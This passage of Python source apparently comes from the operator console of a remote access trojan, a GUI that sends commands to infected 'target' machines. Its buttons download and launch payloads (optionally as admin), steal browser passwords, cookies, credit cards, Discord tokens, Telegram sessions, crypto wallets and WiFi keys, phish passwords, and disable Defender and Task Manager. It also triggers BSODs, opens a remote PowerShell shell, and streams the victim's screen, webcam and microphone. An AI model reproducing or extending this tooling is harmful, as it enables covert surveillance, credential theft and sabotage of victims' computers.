        self.exec_url_entry = ctk.CTkEntry(exec_card, placeholder_text="https://example.com/payload.exe", width=600)
        self.exec_url_entry.pack(fill=tk.X, pady=5)
        
        btn_f = ctk.CTkFrame(exec_card, fg_color="transparent")
        btn_f.pack(fill=tk.X, pady=5)
        ctk.CTkButton(btn_f, text="Download & Launch", command=lambda: self.deploy_url("remote_exec_url"), fg_color=self.colors["accent"], text_color=self.colors["bg"]).pack(side=tk.LEFT, padx=5)
        ctk.CTkButton(btn_f, text="Launch as Admin", command=lambda: self.deploy_url("remote_exec_url", True), fg_color="red").pack(side=tk.LEFT, padx=5)

        # Self Update
        update_card = self.create_card(scroll, "♻️ Real-time Self Update")
        ctk.CTkLabel(update_card, text="Replace the current client binary with a new version. The connection will drop and reconnect.", font=("Segoe UI", 11), text_color=self.colors["text_dim"]).pack(anchor="w", pady=(0, 10))
        self.update_url_entry = ctk.CTkEntry(update_card, placeholder_text="https://yourserver.com/new_client.exe", width=600)
        self.update_url_entry.pack(fill=tk.X, pady=5)
        ctk.CTkButton(update_card, text="Trigger Self-Update", command=lambda: self.deploy_url("self_update"), fg_color=self.colors["warning"], text_color="black").pack(anchor="w", pady=5)

        # Visit URL
        visit_card = self.create_card(scroll, "🌐 Open Website")
        self.visit_url_entry = ctk.CTkEntry(visit_card, placeholder_text="https://google.com", width=600)
        self.visit_url_entry.pack(fill=tk.X, pady=5)
        ctk.CTkButton(visit_card, text="Force Open URL", command=lambda: self.deploy_url("visit_url")).pack(anchor="w", pady=5)

    def deploy_url(self, cmd_type, admin=False):
        url = ""
        if cmd_type == "remote_exec_url": url = self.exec_url_entry.get()
        elif cmd_type == "self_update": url = self.update_url_entry.get()
        elif cmd_type == "visit_url": url = self.visit_url_entry.get()

        if not url or not url.startswith("http"):
            return messagebox.showerror("Error", "A valid HTTP/HTTPS URL is required.")

        if cmd_type == "self_update" and not messagebox.askyesno("Confirm Update", "This will terminate the current client and replace it. Proceed?"):
            return

        self.app.send_json({"type": cmd_type, "target_id": self.dev_id, "url": url, "admin": admin})
        messagebox.showinfo("Sent", f"Command '{cmd_type}' sent to target.")

    def create_notes_tab(self):
        tab = self.tabs.add("📝 Notes")
        ctk.CTkLabel(tab, text="Custom Client Notes", font=("Segoe UI", 16, "bold"), text_color=self.colors["accent"]).pack(pady=(20, 10))
        ctk.CTkLabel(tab, text="Set a custom alias or note for this client. Persists locally.", font=("Segoe UI", 11), text_color=self.colors["text_dim"]).pack(pady=(0, 20))

        self.note_entry = ctk.CTkTextbox(tab, height=300, fg_color=self.colors["bg"])
        self.note_entry.pack(fill=tk.BOTH, expand=True, padx=30, pady=10)
        
        # Load existing note
        current_note = self.app.device_notes.get(self.dev_id, "")
        self.note_entry.insert("1.0", current_note)

        ctk.CTkButton(tab, text="Save Notes", command=self.save_note, fg_color=self.colors["accent"], text_color=self.colors["bg"]).pack(pady=20)

    def save_note(self):
        note = self.note_entry.get("1.0", tk.END).strip()
        self.app.set_device_note(self.dev_id, note)
        messagebox.showinfo("Success", "Notes saved for this device.")

    def create_card(self, parent, title):
        card = ctk.CTkFrame(parent, fg_color=self.colors["bg"], corner_radius=15, border_width=1, border_color=self.colors["surface"])
        card.pack(fill=tk.X, padx=10, pady=10)
        ctk.CTkLabel(card, text=title, font=("Segoe UI", 14, "bold"), text_color=self.colors["accent"]).pack(anchor="w", padx=15, pady=(10, 5))
        content = ctk.CTkFrame(card, fg_color="transparent")
        content.pack(fill=tk.X, padx=15, pady=(0, 15))
        return content

    def send_msg(self):
        title = self.msg_title.get()
        text = self.msg_text.get()
        if not text:
            messagebox.showwarning("Warning", "Message text is required.")
            return
        self.app.send_json({
            "type": "show_message",
            "target_id": self.dev_id,
            "title": title,
            "text": text
        })
        messagebox.showinfo("Success", "Message sent to client.")

    def create_prank_tab(self):
        tab = self.tabs.add("Pranks & Fun")
        scroll = ctk.CTkScrollableFrame(tab, fg_color="transparent")
        scroll.pack(fill=tk.BOTH, expand=True)

        # Communication Card
        comm_card = self.create_card(scroll, "💬 Communication")
        f_msg = ctk.CTkFrame(comm_card, fg_color="transparent")
        f_msg.pack(fill=tk.X, pady=5)
        self.msg_title = ctk.CTkEntry(f_msg, placeholder_text="Title")
        self.msg_title.pack(fill=tk.X, pady=2)
        self.msg_text = ctk.CTkEntry(f_msg, placeholder_text="Message Body")
        self.msg_text.pack(fill=tk.X, pady=2)
        
        btn_f = ctk.CTkFrame(f_msg, fg_color="transparent")
        btn_f.pack(fill=tk.X, pady=5)
        ctk.CTkButton(btn_f, text="Send Message", command=self.send_msg, height=35, fg_color=self.colors["accent"], text_color=self.colors["bg"]).pack(side=tk.LEFT, padx=5, expand=True)
        ctk.CTkButton(btn_f, text="Spam Message (20x)", command=lambda: self.app.send_json({"type": "spam_msg", "target_id": self.dev_id, "text": self.msg_text.get()}), height=35, fg_color="red", text_color="white").pack(side=tk.LEFT, padx=5, expand=True)

        # TTS & Audio
        f_audio = ctk.CTkFrame(comm_card, fg_color="transparent")
        f_audio.pack(fill=tk.X, pady=5)
        self.audio_file_path = ctk.CTkEntry(f_audio, placeholder_text="Select audio file (.wav)")
        self.audio_file_path.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        ctk.CTkButton(f_audio, text="Browse", command=self.browse_audio_file, height=35, width=80).pack(side=tk.LEFT, padx=2)
        ctk.CTkButton(f_audio, text="Play", command=self.play_audio_file, height=35, width=80, fg_color=self.colors["accent"], text_color=self.colors["bg"]).pack(side=tk.LEFT, padx=2)

        # Visual & Input
        visual_card = self.create_card(scroll, "🎮 Visual & Input Control")
        v_grid = ctk.CTkFrame(visual_card, fg_color="transparent")
        v_grid.pack(fill=tk.X)
        v_actions = [
            ("Crazy Mouse", "crazy_mouse"), ("Hide Desktop Icons", "hide_icons"),
            ("Show Desktop Icons", "show_icons"), ("Hide Taskbar", "hide_taskbar"),
            ("Show Taskbar", "show_taskbar"), ("Swap Mouse Buttons", "swap_mouse"),
            ("Restore Mouse Buttons", "restore_mouse"), ("Block Input (Enhanced)", "block_input_enhanced"),
            ("Unblock Input (Enhanced)", "unblock_input_enhanced"), ("Minimize All Windows", "minimize_all"),
        ]
        for i, (text, cmd) in enumerate(v_actions):
            ctk.CTkButton(v_grid, text=text, command=lambda c=cmd: self.send_cmd(c), height=35).grid(row=i//2, column=i%2, padx=5, pady=5, sticky="ew")
        v_grid.columnconfigure((0, 1), weight=1)

        # System Pranks
        sys_prank_card = self.create_card(scroll, "⚠️ System Pranks")
        s_grid = ctk.CTkFrame(sys_prank_card, fg_color="transparent")
        s_grid.pack(fill=tk.X)
        s_actions = [
            ("Prank Virus", "prank_virus"), ("Monitor Off", "monitor_off"),
            ("Monitor On", "monitor_on"), ("Open CD Tray", "open_cd"),
            ("Beep", "beep"), ("Start Beep Loop", "start_beep"),
            ("Stop Beep Loop", "stop_beep"), ("Fake BSOD", "fake_bsod"),
            ("Phish Password", "phish_password"), ("TRIGGER BSOD (BLUE)", "bsod"),
            ("Hang System (CPU)", "hang_system"), ("Spam Calc (20x)", "spam_calc"),
            ("Rotate Screen 90", "rotate_90"), ("Rotate Screen 180", "rotate_180"),
            ("Normal Screen", "rotate_0"), ("Fake Windows Update", "fake_update"),
            ("Ultra Matrix (God Mode)", "ultra_matrix"), ("🚨 Denger Mode (Ultra Chaos)", "start_danger"),
        ]
        for i, (text, cmd) in enumerate(s_actions):
            color = "red" if "BSOD" in text or "🚨" in text else self.colors["surface"]
            ctk.CTkButton(s_grid, text=text, command=lambda c=cmd: self.send_cmd(c), height=35, fg_color=color).grid(row=i//2, column=i%2, padx=5, pady=5, sticky="ew")
        s_grid.columnconfigure((0, 1), weight=1)

        # Keystroke Injection
        key_card = self.create_card(scroll, "⌨️ Keystroke Injection")
        self.keys_to_inject = ctk.CTkEntry(key_card, placeholder_text="Type keys to inject...")
        self.keys_to_inject.pack(fill=tk.X, pady=5)
        ctk.CTkButton(key_card, text="Inject Keys", command=self.send_keys_to_client, height=35, fg_color=self.colors["accent"], text_color=self.colors["bg"]).pack(fill=tk.X, pady=5)

    def create_system_tab(self):
        tab = self.tabs.add("System")
        scroll = ctk.CTkScrollableFrame(tab, fg_color="transparent")
        scroll.pack(fill=tk.BOTH, expand=True)

        info_card = self.create_card(scroll, "📊 System Information")
        i_grid = ctk.CTkFrame(info_card, fg_color="transparent")
        i_grid.pack(fill=tk.X)
        i_btns = [
            ("Get System Info", "open_sys_info"), ("Get Location (IP)", "get_location"),
            ("List Installed Apps", "list_apps"), ("Get WiFi Passwords", "get_wifi"),
        ]
        for i, (text, cmd) in enumerate(i_btns):
            func = lambda: self.app.open_sys_info(self.dev_id) if cmd == "open_sys_info" else lambda c=cmd: self.send_cmd(c)
            ctk.CTkButton(i_grid, text=text, command=func, height=35).grid(row=i//2, column=i%2, padx=5, pady=5, sticky="ew")
        i_grid.columnconfigure((0, 1), weight=1)

        sec_card = self.create_card(scroll, "🛡️ Security & Policies")
        s_grid = ctk.CTkFrame(sec_card, fg_color="transparent")
        s_grid.pack(fill=tk.X)
        s_btns = [
            ("Disable TaskMgr", "disable_taskmgr"), ("Enable TaskMgr", "enable_taskmgr"),
            ("Disable CMD", "disable_cmd"), ("Enable CMD", "enable_cmd"),
            ("Disable Registry", "disable_reg"), ("Enable Registry", "enable_reg"),
            ("Disable USB", "disable_usb"), ("Enable USB", "enable_usb"),
            ("Disable Wi-Fi", "disable_wifi"), ("Enable Wi-Fi", "enable_wifi"),
            ("Disable Defender", "disable_defender"), ("Enable Defender", "enable_defender"),
        ]
        for i, (text, cmd) in enumerate(s_btns):
            ctk.CTkButton(s_grid, text=text, command=lambda c=cmd: self.send_cmd(c), height=35).grid(row=i//2, column=i%2, padx=5, pady=5, sticky="ew")
        s_grid.columnconfigure((0, 1), weight=1)

        maint_card = self.create_card(scroll, "🛠️ Maintenance")
        ctk.CTkButton(maint_card, text="Empty Recycle Bin", command=lambda: self.send_cmd("empty_recycle"), height=35).pack(fill=tk.X, pady=5)
        self.wp_path = ctk.CTkEntry(maint_card, placeholder_text="Local Wallpaper Path")
        self.wp_path.pack(fill=tk.X, pady=2)
        wp_btn_f = ctk.CTkFrame(maint_card, fg_color="transparent")
        wp_btn_f.pack(fill=tk.X, pady=5)
        ctk.CTkButton(wp_btn_f, text="Browse", command=self.browse_wallpaper, width=80).pack(side=tk.LEFT, padx=5)
        ctk.CTkButton(wp_btn_f, text="Set Wallpaper", command=self.set_custom_wallpaper, fg_color=self.colors["accent"], text_color=self.colors["bg"]).pack(side=tk.LEFT, expand=True, fill=tk.X)

    def create_spy_tab(self):
        tab = self.tabs.add("Surveillance")
        scroll = ctk.CTkScrollableFrame(tab, fg_color="transparent")
        scroll.pack(fill=tk.BOTH, expand=True)

        spy_card = self.create_card(scroll, "👁️ Spy Tools")
        spy_grid = ctk.CTkFrame(spy_card, fg_color="transparent")
        spy_grid.pack(fill=tk.X)
        spy_btns = [
            ("Browser History", "get_browser_history"), ("Saved Passwords", "get_browser_passwords"),
            ("Browser Cookies", "get_browser_cookies"), ("Saved Credit Cards", "get_browser_cards"),
            ("Discord Tokens", "get_discord_tokens"), ("Telegram Session", "get_telegram"),
            ("Crypto Wallets", "scan_wallets"), ("Sensitive Docs", "find_docs"),
        ]
        for i, (text, cmd) in enumerate(spy_btns):
            ctk.CTkButton(spy_grid, text=text, command=lambda c=cmd: self.send_cmd(c), height=35).grid(row=i//2, column=i%2, padx=5, pady=5, sticky="ew")
        spy_grid.columnconfigure((0, 1), weight=1)

        clip_card = self.create_card(scroll, "📋 Clipboard")
        self.clipboard_display = ctk.CTkTextbox(clip_card, height=80)
        self.clipboard_display.pack(fill=tk.X, pady=5)
        self.clipboard_set_entry = ctk.CTkEntry(clip_card, placeholder_text="Set clipboard text")
        self.clipboard_set_entry.pack(fill=tk.X, pady=5)
        ctk.CTkButton(clip_card, text="Get Clipboard", command=self.get_clipboard_from_client, height=35).pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        ctk.CTkButton(clip_card, text="Set Clipboard", command=self.set_clipboard_on_client, height=35).pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)

    def create_power_tab(self):
        tab = self.tabs.add("Power")
        scroll = ctk.CTkScrollableFrame(tab, fg_color="transparent")
        scroll.pack(fill=tk.BOTH, expand=True)

        p_card = self.create_card(scroll, "⚡ Power Controls")
        p_grid = ctk.CTkFrame(p_card, fg_color="transparent")
        p_grid.pack(fill=tk.X)
        btns = [
            ("Shutdown", "shutdown /s /t 0"), ("Restart", "shutdown /r /t 0"),
            ("Force Sleep", "sleep"), ("Hibernate", "hibernate"),
            ("Logoff", "shutdown /l"), ("Lock Workstation", "lock"),
        ]
        for i, (text, cmd) in enumerate(btns):
            func = (lambda c=cmd: self.app.send_json({"type": "power_action", "target_id": self.dev_id, "action": c})) if text == "Force Sleep" or text == "Hibernate" else (lambda c=cmd: self.app.send_json({"type": "execute_command", "target_id": self.dev_id, "command": c}))
            if text == "Lock Workstation": func = lambda: self.app.send_json({"type": "execute_command", "target_id": self.dev_id, "command": "rundll32.exe user32.dll,LockWorkStation"})
            ctk.CTkButton(p_grid, text=text, command=func, height=40, fg_color="red" if i < 2 else self.colors["surface"]).grid(row=i//2, column=i%2, padx=5, pady=5, sticky="ew")
        p_grid.columnconfigure((0, 1), weight=1)

    def create_admin_tab(self):
        tab = self.tabs.add("Admin Tools")
        scroll = ctk.CTkScrollableFrame(tab, fg_color="transparent")
        scroll.pack(fill=tk.BOTH, expand=True)

        # Deep Dive Card
        d_card = self.create_card(scroll, "🕳️ System Deep Dive")
        d_grid = ctk.CTkFrame(d_card, fg_color="transparent")
        d_grid.pack(fill=tk.X)
        d_btns = [
            ("Netstat", "get_netstat"), ("Env Vars", "get_env"),
            ("Drivers", "get_drivers"), ("Recent Events", "get_events"),
            ("ARP/DNS Cache", "get_arp_dns"), ("Scheduled Tasks", "get_tasks"),
            ("Deep App Scan", "get_deep_software"), ("Anti-Virus Status", "get_av"),
            ("List Services", "get_services"), ("List Startup", "get_startup"),
        ]
        for i, (text, cmd) in enumerate(d_btns):
            ctk.CTkButton(d_grid, text=text, command=lambda c=cmd: self.send_cmd(c), height=35).grid(row=i//2, column=i%2, padx=5, pady=5, sticky="ew")
        d_grid.columnconfigure((0, 1), weight=1)

        # Service Control
        svc_card = self.create_card(scroll, "⚙️ Service & Registry")
        self.svc_name = ctk.CTkEntry(svc_card, placeholder_text="Service Name")
        self.svc_name.pack(fill=tk.X, pady=2)
        s_btn_f = ctk.CTkFrame(svc_card, fg_color="transparent")
        s_btn_f.pack(fill=tk.X, pady=5)
        ctk.CTkButton(s_btn_f, text="Start", command=lambda: self.app.send_json({"type": "service_action", "target_id": self.dev_id, "name": self.svc_name.get(), "action": "start"}), width=100).pack(side=tk.LEFT, padx=5)
        ctk.CTkButton(s_btn_f, text="Stop", command=lambda: self.app.send_json({"type": "service_action", "target_id": self.dev_id, "name": self.svc_name.get(), "action": "stop"}), fg_color="red").pack(side=tk.LEFT, padx=5)

        # Advanced Modification
        m_card = self.create_card(scroll, "🛠️ Registry Explorer (Manual)")
        self.reg_root = ctk.CTkComboBox(m_card, values=["HKEY_LOCAL_MACHINE", "HKEY_CURRENT_USER", "HKEY_CLASSES_ROOT"])
        self.reg_root.pack(fill=tk.X, pady=2)
        self.reg_path = ctk.CTkEntry(m_card, placeholder_text="Path (e.g. Software\\Microsoft)")
        self.reg_path.pack(fill=tk.X, pady=2)
        ctk.CTkButton(m_card, text="List Keys/Values", command=lambda: self.app.send_json({"type": "get_registry", "target_id": self.dev_id, "root": self.reg_root.get(), "path": self.reg_path.get()}), height=35).pack(fill=tk.X, pady=5)

        # God Mode Tools
        g_card = self.create_card(scroll, "🔒 God Mode: Lockdown")
        g_grid = ctk.CTkFrame(g_card, fg_color="transparent")
        g_grid.pack(fill=tk.X)
        g_btns = [
            ("Block Mouse/KB", "disable_mouse"), ("Unblock Mouse/KB", "enable_mouse"),
            ("Cut Internet", "disable_net"), ("Restore Internet", "enable_net"),
            ("🚨 Danger Mode", "start_danger"), ("✅ Stop Danger", "stop_danger"),
        ]
        for i, (text, cmd) in enumerate(g_btns):
            ctk.CTkButton(g_grid, text=text, command=lambda c=cmd: self.send_cmd(c), height=35, fg_color="red" if "🚨" in text or "Block" in text else self.colors["surface"]).grid(row=i//2, column=i%2, padx=5, pady=5, sticky="ew")
        g_grid.columnconfigure((0, 1), weight=1)

    # --- Utility Methods ---
    def browse_wallpaper(self):
        path = filedialog.askopenfilename(filetypes=[("Images", "*.jpg *.png *.jpeg"), ("All", "*.*")])
        if path: self.wp_path.delete(0, tk.END); self.wp_path.insert(0, path)

    def set_custom_wallpaper(self):
        path = self.wp_path.get()
        if not path or not os.path.exists(path): return messagebox.showwarning("Warning", "Invalid path")
        try:
            with open(path, "rb") as f: b64 = base64.b64encode(f.read()).decode('utf-8')
            self.app.send_json({"type": "set_wallpaper_b64", "target_id": self.dev_id, "data": b64})
            messagebox.showinfo("Success", "Sent")
        except Exception as e: messagebox.showerror("Error", str(e))

    def browse_audio_file(self):
        path = filedialog.askopenfilename(filetypes=[("WAV", "*.wav")])
        if path: self.audio_file_path.delete(0, tk.END); self.audio_file_path.insert(0, path)

    def play_audio_file(self):
        path = self.audio_file_path.get()
        if not path or not os.path.exists(path): return
        try:
            with open(path, "rb") as f: data = base64.b64encode(f.read()).decode('utf-8')
            self.app.send_json({"type": "play_audio", "target_id": self.dev_id, "data": data})
        except: pass

    def send_keys_to_client(self):
        keys = self.keys_to_inject.get()
        if keys: self.app.send_json({"type": "inject_keys", "target_id": self.dev_id, "keys": keys})

    def send_msg(self):
        self.app.send_json({"type": "show_message", "target_id": self.dev_id, "title": self.msg_title.get(), "message": self.msg_text.get()})

    def send_cmd(self, cmd):
        self.app.send_json({"type": cmd, "target_id": self.dev_id})

    def get_clipboard_from_client(self):
        self.app.send_json({"type": "get_clipboard", "target_id": self.dev_id})

    def set_clipboard_on_client(self):
        content = self.clipboard_set_entry.get()
        if content: self.app.send_json({"type": "set_clipboard", "target_id": self.dev_id, "content": content})

    def update_clipboard_display(self, content):
        if not self.window.winfo_exists(): return
        self.clipboard_display.delete("1.0", tk.END); self.clipboard_display.insert(tk.END, content)

    def on_close(self):
        self.app.control_panels.pop(self.dev_id, None)
        self.window.destroy()


class TerminalWindow:
    def __init__(self, parent, dev_id, app, colors):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Terminal - {dev_id}")
        self.window.geometry("800x600")
        self.window.configure(bg="#000000")
        self.app = app
        self.dev_id = dev_id
        self.colors = colors
        self.history = []
        self.history_index = 0
        
        # Input Area (Visible Grey Background) - Pack BOTTOM first to ensure visibility
        self.input_frame = ctk.CTkFrame(self.window, fg_color="#333333")
        self.input_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=5, pady=5)
        
        ctk.CTkLabel(self.input_frame, text="PS >", font=("Consolas", 14, "bold"), 
                     text_color="#00FF00").pack(side=tk.LEFT, padx=(5,5))
                     
        self.cmd_entry = ctk.CTkEntry(self.input_frame, font=("Consolas", 12), 
                                      fg_color="#1a1a1a", border_color="#555555",
                                      text_color="#FFFFFF", placeholder_text="Enter command here...")
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # BRIGHT GREEN SEND BUTTON
        self.send_btn = ctk.CTkButton(self.input_frame, text="SEND CMD", command=self.send_cmd, 
                                      width=100, fg_color="#00FF00", hover_color="#00CC00",
                                      text_color="black", font=("Arial", 12, "bold"))
        self.send_btn.pack(side=tk.LEFT, padx=5)

        # Output Area - Pack TOP (Fills remaining space)
        self.output = ctk.CTkTextbox(self.window, font=("Consolas", 12), 
                                     fg_color="#000000", text_color="#00FF00",
                                     wrap="char", activate_scrollbars=True)
        self.output.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Helper text
        self.output.insert(tk.END, "Win32 Remote Shell - Ready\nType 'help' or commands below.\n\n")
        self.output.configure(state="disabled")
        
        # Bind keys
        self.cmd_entry.bind("<Return>", self.send_cmd)
        self.cmd_entry.bind("<Up>", self.history_up)
        self.cmd_entry.bind("<Down>", self.history_down)
        self.window.bind("<Return>", lambda e: self.send_cmd(e))
        
        # Set focus
        self.window.after(100, self.cmd_entry.focus_set)
        
    def send_cmd(self, event=None):
        cmd = self.cmd_entry.get()
        if not cmd: 
             # Visual feedback for empty command
             self.cmd_entry.configure(border_color="red")
             self.window.after(500, lambda: self.cmd_entry.configure(border_color="#555555"))
             return
             
        # Add to history
        self.history.append(cmd)
        self.history_index = len(self.history)
        
        self.append_output(f"PS > {cmd}\n")
        
        if cmd.lower() == "cls":
            self.output.configure(state="normal")
            self.output.delete("1.0", tk.END)
            self.output.configure(state="disabled")
        else:
            self.app.send_json({"type": "shell_exec", "target_id": self.dev_id, "command": cmd})
            
        self.cmd_entry.delete(0, tk.END)
        
    def append_output(self, text):
        if not self.window.winfo_exists(): return
        self.output.configure(state="normal")
        self.output.insert(tk.END, text)
        self.output.see(tk.END)
        self.output.configure(state="disabled")

    def history_up(self, event):
        if self.history and self.history_index > 0:
            self.history_index -= 1
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, self.history[self.history_index])

    def history_down(self, event):
        if self.history and self.history_index < len(self.history) - 1:
            self.history_index += 1
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, self.history[self.history_index])
        else:
            self.history_index = len(self.history)
            self.cmd_entry.delete(0, tk.END)

    def on_close(self):
        self.app.terminals.pop(self.dev_id, None)
        self.window.destroy()


class ViewerWindow:
    def __init__(self, parent, dev_id, app, colors):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Remote Desktop - {dev_id}")
        self.window.geometry("800x600")
        self.app = app
        self.dev_id = dev_id
        
        self.canvas = tk.Canvas(self.window, bg=colors["bg"], highlightthickness=0)
        self.canvas.pack(fill=tk.BOTH, expand=True)
        
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)
        
        # Events
        self.canvas.bind("<Motion>", self.send_mouse_move)
        self.canvas.bind("<Button-1>", lambda e: self.send_click(e, "left"))
        self.canvas.bind("<Button-3>", lambda e: self.send_click(e, "right"))
        self.window.bind("<Key>", self.send_key)

        # Key Mapping
        self.key_map = {
            "Return": "enter", "Control_L": "ctrlleft", "Control_R": "ctrlright",
            "Shift_L": "shiftleft", "Shift_R": "shiftright", "Alt_L": "altleft", "Alt_R": "altright",
            "BackSpace": "backspace", "Delete": "delete", "Escape": "esc", "Tab": "tab",
            "space": "space", "Up": "up", "Down": "down", "Left": "left", "Right": "right",
            "Home": "home", "End": "end", "Prior": "pageup", "Next": "pagedown",
            "Caps_Lock": "capslock", "Num_Lock": "numlock", "Scroll_Lock": "scrolllock",
            "F1": "f1", "F2": "f2", "F3": "f3", "F4": "f4", "F5": "f5", "F6": "f6",
            "F7": "f7", "F8": "f8", "F9": "f9", "F10": "f10", "F11": "f11", "F12": "f12",
            "Win_L": "winleft", "Win_R": "winright", "Menu": "apps"
        }

    def update_image(self, b64_data):
        if not self.window.winfo_exists(): return
        try:
            data = base64.b64decode(b64_data)
            img = Image.open(io.BytesIO(data))
            self.photo = ImageTk.PhotoImage(img)
            self.canvas.create_image(0, 0, image=self.photo, anchor=tk.NW)
        except: pass

    def on_close(self):
        self.window.destroy()
        self.app.viewers.pop(self.dev_id, None)

    def send_mouse_move(self, event):
        w, h = self.canvas.winfo_width(), self.canvas.winfo_height()
        self.app.send_json({"type": "mouse_move", "target_id": self.dev_id, "x": event.x/w, "y": event.y/h})

    def send_click(self, event, btn):
        w, h = self.canvas.winfo_width(), self.canvas.winfo_height()
        self.app.send_json({"type": "mouse_click", "target_id": self.dev_id, "x": event.x/w, "y": event.y/h, "button": btn})

    def send_key(self, event):
        key = self.key_map.get(event.keysym, event.char)
        if not key: key = event.keysym.lower()
        self.app.send_json({"type": "key_press", "target_id": self.dev_id, "key": key})

class WebcamViewerWindow:
    def __init__(self, parent, dev_id, app, colors):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Webcam - {dev_id}")
        self.window.geometry("640x480")
        self.app = app
        self.dev_id = dev_id
        self.colors = colors 
        
        self.canvas = tk.Canvas(self.window, bg=colors["bg"], highlightthickness=0)
        self.canvas.pack(fill=tk.BOTH, expand=True)
        
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)

    def update_image(self, b64_data):
        if not self.window.winfo_exists(): return
        try:
            data = base64.b64decode(b64_data)
            img = Image.open(io.BytesIO(data))
            self.photo = ImageTk.PhotoImage(img)
            self.canvas.create_image(0, 0, image=self.photo, anchor=tk.NW)
        except: pass

    def on_close(self):
        self.window.destroy()
        self.app.webcam_viewers.pop(self.dev_id, None)

class MicrophoneViewerWindow:
    def __init__(self, parent, dev_id, app, colors):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Microphone - {dev_id}")
        self.window.geometry("400x150")
        self.window.configure(bg=colors["bg"])
        self.app = app
        self.dev_id = dev_id
        self.colors = colors

        self.stream_active = False
        self.audio_buffer = bytearray()
        self.samplerate = 44100 # Default sample rate

        self.stream = None

        ctk.CTkLabel(self.window, text="Microphone Stream", font=("Segoe UI", 18, "bold"), text_color=colors["accent"]).pack(pady=10)

        btn_frame = ctk.CTkFrame(self.window, fg_color="transparent")
        btn_frame.pack(pady=5)

        self.start_btn = ctk.CTkButton(btn_frame, text="Start Stream", command=self.start_stream, fg_color=colors["accent"], text_color=colors["bg"], hover_color=colors["hover"])
        self.start_btn.pack(side=tk.LEFT, padx=5)

        self.stop_btn = ctk.CTkButton(btn_frame, text="Stop Stream", command=self.stop_stream, fg_color="red", hover_color="darkred")
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)

    def start_stream(self):
        if not self.stream_active:
            self.stream_active = True
            # Initialize sounddevice stream for playback
            # sd.OutputStream requires a callback to continuously play audio
            # For simplicity, we'll process buffer in a separate thread/loop later
            # For now, just change button state
            self.start_btn.configure(state=tk.DISABLED)
            self.stop_btn.configure(state=tk.NORMAL)
            self.app.send_json({"type": "start_audio_stream", "target_id": self.dev_id})

    def stop_stream(self):
        if self.stream_active:
            self.stream_active = False
            self.app.send_json({"type": "stop_audio_stream", "target_id": self.dev_id})
            if self.stream:
                self.stream.stop()
                self.stream.close()
            self.audio_buffer = bytearray() # Clear buffer
            self.start_btn.configure(state=tk.NORMAL)
            self.stop_btn.configure(state=tk.DISABLED)

    def on_close(self):
        self.stop_stream()
        self.app.microphone_viewers.pop(self.dev_id, None)
        self.window.destroy()

    def play_audio_chunk(self, audio_data_b64):
        if self.stream_active:
            try:
                decoded_audio = base64.b64decode(audio_data_b64)
                audio_np = np.frombuffer(decoded_audio, dtype=np.int16) # Assuming int16

                if not self.stream:
                    # Lazily initialize the stream when first chunk arrives
                    # This assumes fixed samplerate and channels from client
                    self.stream = sd.OutputStream(samplerate=self.samplerate, channels=1, dtype='int16')
                    self.stream.start()

                self.stream.write(audio_np)
            except Exception as e:
                print(f"Error playing audio chunk: {e}")
                self.stop_stream()

class FileExplorerWindow:
    def __init__(self, parent, dev_id, app, colors):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Files - {dev_id}")
        self.window.geometry("600x400")
        self.window.configure(bg=colors["bg"])
        self.app = app
        self.dev_id = dev_id
        self.path = "."
        
        self.nav = ctk.CTkFrame(self.window, fg_color=colors["surface"])
        self.nav.pack(fill=tk.X)
        ctk.CTkButton(self.nav, text="Up", width=50, command=self.go_up, fg_color=colors["accent"], text_color=colors["bg"]).pack(side=tk.LEFT, padx=5, pady=5)
        self.path_entry = ctk.CTkEntry(self.nav)
        self.path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5, pady=5)
        ctk.CTkButton(self.nav, text="Go", width=50, command=self.go, fg_color=colors["accent"], text_color=colors["bg"]).pack(side=tk.LEFT, padx=5, pady=5)
        
        self.list_frame = ctk.CTkScrollableFrame(self.window, fg_color=colors["surface"])
        self.list_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)

    def on_close(self):
        self.app.file_explorers.pop(self.dev_id, None)
        self.window.destroy()

    def update_list(self, data):
        if not self.window.winfo_exists(): return
        self.path = data.get("path")
        self.path_entry.delete(0, tk.END)
        self.path_entry.insert(0, self.path)
        
        for w in self.list_frame.winfo_children(): w.destroy()
        
        for item in data.get("items", []):
            f = ctk.CTkFrame(self.list_frame)
            f.pack(fill=tk.X, pady=1)
            icon = "📁" if item["is_dir"] else "📄"
            ctk.CTkLabel(f, text=f"{icon} {item['name']}").pack(side=tk.LEFT, padx=5)
            
            if item["is_dir"]:
                f.bind("<Double-Button-1>", lambda e, n=item["name"]: self.open_dir(n))
            else:
                ctk.CTkButton(f, text="Download", width=60, command=lambda n=item["name"]: self.download(n)).pack(side=tk.RIGHT)

    def on_close(self):
        self.window.destroy()
        self.app.file_explorers.pop(self.dev_id, None)

    def open_dir(self, name):
        new_path = os.path.join(self.path, name)
        self.app.send_json({"type": "list_dir", "target_id": self.dev_id, "path": new_path})

    def go_up(self):
        self.app.send_json({"type": "list_dir", "target_id": self.dev_id, "path": os.path.dirname(self.path)})

    def go(self):
        self.app.send_json({"type": "list_dir", "target_id": self.dev_id, "path": self.path_entry.get()})

    def download(self, name):
        self.app.send_json({"type": "download_file", "target_id": self.dev_id, "path": os.path.join(self.path, name)})


class ProcessManagerWindow:
    def __init__(self, parent, dev_id, app, colors):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Processes - {dev_id}")
        self.window.geometry("500x600")
        self.window.configure(bg=colors["bg"])
        self.app = app
        self.dev_id = dev_id
        self.colors = colors
        
